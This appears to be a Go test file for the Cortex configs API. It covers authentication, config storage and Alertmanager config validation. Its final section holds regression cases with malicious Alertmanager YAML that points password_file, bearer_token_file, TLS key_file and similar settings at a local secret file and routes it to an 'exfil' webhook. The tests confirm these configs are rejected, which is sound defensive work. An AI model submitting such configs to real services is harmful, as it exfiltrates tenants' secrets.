package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path"
	"strings"
	"testing"

	"github.com/cortexproject/cortex/pkg/configs/userconfig"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const (
	rulesEndpoint        = "/api/prom/configs/rules"
	rulesPrivateEndpoint = "/private/api/prom/configs/rules"

	alertManagerConfigEndpoint        = "/api/prom/configs/alertmanager"
	alertManagerConfigPrivateEndpoint = "/private/api/prom/configs/alertmanager"
)

var (
	rulesClient              = configurable{rulesEndpoint, rulesPrivateEndpoint}
	alertManagerConfigClient = configurable{alertManagerConfigEndpoint, alertManagerConfigPrivateEndpoint}

	allClients = []configurable{rulesClient, alertManagerConfigClient}
)

// The root page returns 200 OK.
func Test_Root_OK(t *testing.T) {
	setup(t)
	defer cleanup(t)

	w := request(t, "GET", "/", nil)
	assert.Equal(t, http.StatusOK, w.Code)
}

type configurable struct {
	Endpoint        string
	PrivateEndpoint string
}

// post a config
func (c configurable) post(t *testing.T, userID string, config userconfig.Config) userconfig.View {
	w := requestAsUser(t, userID, "POST", c.Endpoint, "", readerFromConfig(t, config))
	require.Equal(t, http.StatusNoContent, w.Code)
	return c.get(t, userID)
}

// get a config
func (c configurable) get(t *testing.T, userID string) userconfig.View {
	w := requestAsUser(t, userID, "GET", c.Endpoint, "", nil)
	return parseView(t, w.Body.Bytes())
}

// configs returns 401 to requests without authentication.
func Test_GetConfig_Anonymous(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, c := range allClients {
		w := request(t, "GET", c.Endpoint, nil)
		assert.Equal(t, http.StatusUnauthorized, w.Code)
	}
}

// configs returns 404 if no config has been created yet.
func Test_GetConfig_NotFound(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	for _, c := range allClients {
		w := requestAsUser(t, userID, "GET", c.Endpoint, "", nil)
		assert.Equal(t, http.StatusNotFound, w.Code)
	}
}

// configs returns 401 to requests without authentication.
func Test_PostConfig_Anonymous(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, c := range allClients {
		w := request(t, "POST", c.Endpoint, nil)
		assert.Equal(t, http.StatusUnauthorized, w.Code)
	}
}

// Posting to a configuration sets it so that you can get it again.
func Test_PostConfig_CreatesConfig(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	config := makeConfig()
	for _, c := range allClients {
		{
			w := requestAsUser(t, userID, "POST", c.Endpoint, "", readerFromConfig(t, config))
			assert.Equal(t, http.StatusNoContent, w.Code)
		}
		{
			w := requestAsUser(t, userID, "GET", c.Endpoint, "", nil)
			assert.Equal(t, config, parseView(t, w.Body.Bytes()).Config)
		}
	}
}

// Posting to a configuration sets it so that you can get it again.
func Test_PostConfig_UpdatesConfig(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	for _, c := range allClients {
		view1 := c.post(t, userID, makeConfig())
		config2 := makeConfig()
		view2 := c.post(t, userID, config2)
		assert.True(t, view2.ID > view1.ID, "%v > %v", view2.ID, view1.ID)
		assert.Equal(t, config2, view2.Config)
	}
}

// Different users can have different configurations.
func Test_PostConfig_MultipleUsers(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID1 := makeUserID()
	userID2 := makeUserID()
	for _, c := range allClients {
		config1 := c.post(t, userID1, makeConfig())
		config2 := c.post(t, userID2, makeConfig())
		foundConfig1 := c.get(t, userID1)
		assert.Equal(t, config1, foundConfig1)
		foundConfig2 := c.get(t, userID2)
		assert.Equal(t, config2, foundConfig2)
		assert.True(t, config2.ID > config1.ID, "%v > %v", config2.ID, config1.ID)
	}
}

// GetAllConfigs returns an empty list of configs if there aren't any.
func Test_GetAllConfigs_Empty(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, c := range allClients {
		w := request(t, "GET", c.PrivateEndpoint, nil)
		assert.Equal(t, http.StatusOK, w.Code)
		var found ConfigsView
		err := json.Unmarshal(w.Body.Bytes(), &found)
		assert.NoError(t, err, "Could not unmarshal JSON")
		assert.Equal(t, ConfigsView{Configs: map[string]userconfig.View{}}, found)
	}
}

// GetAllConfigs returns all created userconfig.
func Test_GetAllConfigs(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	config := makeConfig()

	for _, c := range allClients {
		view := c.post(t, userID, config)
		w := request(t, "GET", c.PrivateEndpoint, nil)
		assert.Equal(t, http.StatusOK, w.Code)
		var found ConfigsView
		err := json.Unmarshal(w.Body.Bytes(), &found)
		assert.NoError(t, err, "Could not unmarshal JSON")
		assert.Equal(t, ConfigsView{Configs: map[string]userconfig.View{
			userID: view,
		}}, found)
	}
}

// GetAllConfigs returns the *newest* versions of all created userconfig.
func Test_GetAllConfigs_Newest(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()

	for _, c := range allClients {
		c.post(t, userID, makeConfig())
		c.post(t, userID, makeConfig())
		lastCreated := c.post(t, userID, makeConfig())

		w := request(t, "GET", c.PrivateEndpoint, nil)
		assert.Equal(t, http.StatusOK, w.Code)
		var found ConfigsView
		err := json.Unmarshal(w.Body.Bytes(), &found)
		assert.NoError(t, err, "Could not unmarshal JSON")
		assert.Equal(t, ConfigsView{Configs: map[string]userconfig.View{
			userID: lastCreated,
		}}, found)
	}
}

func Test_GetConfigs_IncludesNewerConfigsAndExcludesOlder(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, c := range allClients {
		c.post(t, makeUserID(), makeConfig())
		config2 := c.post(t, makeUserID(), makeConfig())
		userID3 := makeUserID()
		config3 := c.post(t, userID3, makeConfig())

		w := request(t, "GET", fmt.Sprintf("%s?since=%d", c.PrivateEndpoint, config2.ID), nil)
		assert.Equal(t, http.StatusOK, w.Code)
		var found ConfigsView
		err := json.Unmarshal(w.Body.Bytes(), &found)
		assert.NoError(t, err, "Could not unmarshal JSON")
		assert.Equal(t, ConfigsView{Configs: map[string]userconfig.View{
			userID3: config3,
		}}, found)
	}
}

var amCfgValidationTests = []struct {
	config      string
	shouldFail  bool
	errContains string
}{
	{
		config:      "invalid config",
		shouldFail:  true,
		errContains: "yaml",
	}, {
		config: `
        global:
          smtp_smarthost: localhost:25
          smtp_from: alertmanager@example.org
        route:
          receiver: noop

        receivers:
        - name: noop
          email_configs:
          - to: myteam@foobar.org`,
		shouldFail:  true,
		errContains: ErrEmailNotificationsAreDisabled.Error(),
	}, {
		config: `
        global:
          smtp_smarthost: localhost:25
          smtp_from: alertmanager@example.org
        route:
          receiver: noop

        receivers:
        - name: noop
          slack_configs:
          - api_url: http://slack`,
		shouldFail: false,
	},
}

func Test_ValidateAlertmanagerConfig(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	for i, test := range amCfgValidationTests {
		resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager/validate", "", strings.NewReader(test.config))
		data := map[string]string{}
		err := json.Unmarshal(resp.Body.Bytes(), &data)
		assert.NoError(t, err, "test case %d", i)

		success := map[string]string{
			"status": "success",
		}
		if !test.shouldFail {
			assert.Equal(t, success, data, "test case %d", i)
			assert.Equal(t, http.StatusOK, resp.Code, "test case %d", i)
			continue
		}

		assert.Equal(t, "error", data["status"], "test case %d", i)
		assert.Contains(t, data["error"], test.errContains, "test case %d", i)
	}
}

func Test_SetConfig_ValidatesAlertmanagerConfig(t *testing.T) {
	setup(t)
	defer cleanup(t)

	userID := makeUserID()
	for i, test := range amCfgValidationTests {
		cfg := userconfig.Config{AlertmanagerConfig: test.config, RulesConfig: userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2}}
		resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))

		if !test.shouldFail {
			assert.Equal(t, http.StatusNoContent, resp.Code, "test case %d", i)
			continue
		}

		assert.Equal(t, http.StatusBadRequest, resp.Code, "test case %d", i)
		assert.Contains(t, resp.Body.String(), test.errContains, "test case %d", i)
	}
}

func Test_SetConfig_ValidatesAlertmanagerConfig_WithEmailEnabled(t *testing.T) {
	config := `
        global:
          smtp_smarthost: localhost:25
          smtp_from: alertmanager@example.org
        route:
          receiver: noop

        receivers:
        - name: noop
          email_configs:
          - to: myteam@foobar.org`
	setupWithEmailEnabled(t)
	defer cleanup(t)

	userID := makeUserID()
	cfg := userconfig.Config{AlertmanagerConfig: config, RulesConfig: userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2}}
	resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))

	assert.Equal(t, http.StatusNoContent, resp.Code)
}

func Test_SetConfig_BodyFormat(t *testing.T) {
	setup(t)
	defer cleanup(t)
	for _, bodyFile := range []string{"testdata/config.yml", "testdata/config.json"} {
		var contentType string
		switch path.Ext(bodyFile) {
		case ".yml":
			contentType = "text/yaml"
		default:
			contentType = "text/json"
		}
		testSetConfigBodyFormat(bodyFile, contentType, t)
	}
}

func testSetConfigBodyFormat(bodyFile string, contentType string, t *testing.T) {
	userID := makeUserID()
	file, err := os.Open(bodyFile)
	require.NoError(t, err)
	defer file.Close()
	resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", contentType, file)
	assert.Equal(t, http.StatusNoContent, resp.Code, "error body: %s Content-Type: %s", resp.Body.String(), contentType)
}

func TestParseConfigFormat(t *testing.T) {
	tests := []struct {
		name          string
		defaultFormat string
		expected      string
	}{
		{"", FormatInvalid, FormatInvalid},
		{"", FormatJSON, FormatJSON},
		{"application/json", FormatInvalid, FormatJSON},
		{"application/yaml", FormatInvalid, FormatYAML},
		{"application/json, application/yaml", FormatInvalid, FormatJSON},
		{"application/yaml, application/json", FormatInvalid, FormatYAML},
		{"text/plain, application/yaml", FormatInvalid, FormatYAML},
		{"application/yaml; a=1", FormatInvalid, FormatYAML},
	}
	for _, test := range tests {
		t.Run(test.name+"_"+test.expected, func(t *testing.T) {
			actual := parseConfigFormat(test.name, test.defaultFormat)
			assert.Equal(t, test.expected, actual)
		})
	}
}

// amCfgFileBlocklistCases enumerates the Alertmanager *_file / TLS-file settings
// that the pkg/alertmanager blocklist rejects on POST /api/v1/alerts. The
// configs service must reject them identically on every write path it exposes
// (POST /api/prom/configs/alertmanager and POST
// /api/prom/configs/alertmanager/validate); otherwise a tenant can regain the
// arbitrary local-file-read / secret-exfiltration primitive by routing their
// malicious YAML through the legacy configs service feeding the configdb
// alertstore backend. See the finding attached to this change for background.
var amCfgFileBlocklistCases = []struct {
	name        string
	config      string
	errContains string
}{
	{
		name: "basic_auth password_file",
		config: `
        route:
          receiver: exfil
        receivers:
        - name: exfil
          webhook_configs:
          - url: http://example.invalid/
            http_config:
              basic_auth:
                username: x
                password_file: /tmp/victim-secret`,
		errContains: "password_file",
	},
	{
		name: "bearer_token_file",
		config: `
        route:
          receiver: exfil
        receivers:
        - name: exfil
          webhook_configs:
          - url: http://example.invalid/
            http_config:
              bearer_token_file: /tmp/victim-secret`,
		errContains: "password_file",
	},
	{
		name: "authorization credentials_file",
		config: `
        route:
          receiver: exfil
        receivers:
        - name: exfil
          webhook_configs:
          - url: http://example.invalid/
            http_config:
              authorization:
                type: Bearer
                credentials_file: /tmp/victim-secret`,
		errContains: "password_file",
	},
	{
		name: "tls_config key_file",
		config: `
        route:
          receiver: exfil
        receivers:
        - name: exfil
          webhook_configs:
          - url: http://example.invalid/
            http_config:
              tls_config:
                key_file: /tmp/victim-secret`,
		errContains: "TLS",
	},
	{
		name: "global slack_api_url_file",
		config: `
        global:
          slack_api_url_file: /tmp/victim-secret
        route:
          receiver: slack
        receivers:
        - name: slack
          slack_configs:
          - channel: '#x'`,
		errContains: "slack_api_url_file",
	},
	{
		name: "slack api_url_file",
		config: `
        route:
          receiver: slack
        receivers:
        - name: slack
          slack_configs:
          - api_url_file: /tmp/victim-secret
            channel: '#x'`,
		errContains: "slack_api_url_file",
	},
	{
		name: "victorops api_key_file",
		config: `
        route:
          receiver: vo
        receivers:
        - name: vo
          victorops_configs:
          - api_key_file: /tmp/victim-secret
            routing_key: foo`,
		errContains: "VictorOps api_key_file",
	},
}

// Test_SetConfig_RejectsFileBlocklist verifies POST /api/prom/configs/alertmanager
// — the ingestion path that previously bypassed the Alertmanager *_file blocklist
// (CWE-73) — now returns HTTP 400 for every *_file / TLS-file variant.
func Test_SetConfig_RejectsFileBlocklist(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, tc := range amCfgFileBlocklistCases {
		t.Run(tc.name, func(t *testing.T) {
			userID := makeUserID()
			cfg := userconfig.Config{
				AlertmanagerConfig: tc.config,
				RulesConfig:        userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2},
			}
			resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))
			assert.Equal(t, http.StatusBadRequest, resp.Code, "body: %s", resp.Body.String())
			assert.Contains(t, resp.Body.String(), tc.errContains)
		})
	}
}

// Test_ValidateAlertmanagerConfig_RejectsFileBlocklist verifies that
// POST /api/prom/configs/alertmanager/validate — which previously used the same
// weak validator as setConfig — now rejects every *_file / TLS-file variant.
func Test_ValidateAlertmanagerConfig_RejectsFileBlocklist(t *testing.T) {
	setup(t)
	defer cleanup(t)

	for _, tc := range amCfgFileBlocklistCases {
		t.Run(tc.name, func(t *testing.T) {
			userID := makeUserID()
			resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager/validate", "", strings.NewReader(tc.config))
			assert.Equal(t, http.StatusBadRequest, resp.Code, "body: %s", resp.Body.String())
			data := map[string]string{}
			require.NoError(t, json.Unmarshal(resp.Body.Bytes(), &data))
			assert.Equal(t, "error", data["status"])
			assert.Contains(t, data["error"], tc.errContains)
		})
	}
}

func Test_SetConfig_ValidateTemplateFiles(t *testing.T) {
	cfg := userconfig.Config{
		TemplateFiles: map[string]string{
			"mytemplate.tmpl": `
				{{ define "mytemplate" }}
				ToUpper{{ .Value | toUpper }}
				ToLower{{ .Value | toLower }}
				Title{{ .Value | title }}
				Join{{ .Values | join " " }}
				Match{{ .Value | match "fir" }}
				SafeHTML{{ .Value | safeHtml }}
				ReReplaceAll{{ .Value | reReplaceAll "-" "_" }}
				StringSlice{{ .Value | stringSlice }}
				{{ end }}
			`,
		},
	}

	err := validateTemplateFiles(cfg)
	assert.Equal(t, nil, err)
}
